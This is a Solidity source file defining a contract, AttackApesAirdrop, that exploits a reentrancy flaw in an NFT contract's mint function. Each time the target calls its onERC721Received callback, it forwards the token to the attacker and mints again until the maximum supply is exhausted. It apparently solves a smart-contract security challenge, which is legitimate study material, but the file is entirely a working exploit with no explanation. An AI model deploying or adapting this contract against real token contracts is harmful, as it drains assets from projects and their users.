// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IApes {
    function mint() external returns (uint16);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function maxSupply() external returns (uint16);
}

contract AttackApesAirdrop {
    IApes apes;
    address owner;

    constructor(address _apes) {
        apes = IApes(_apes);
        owner = msg.sender;
    }

    function exploit() external {
        apes.mint();
    }

    function onERC721Received(address _sender, address _from, uint256 _tokenId, bytes memory _data)
        external
        returns (bytes4 retval)
    {
        require(msg.sender == address(apes), "Not Apes");
        apes.transferFrom(address(this), owner, _tokenId);

        if (_tokenId < apes.maxSupply()) {
            apes.mint();
        }
        return AttackApesAirdrop.onERC721Received.selector;
        // return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
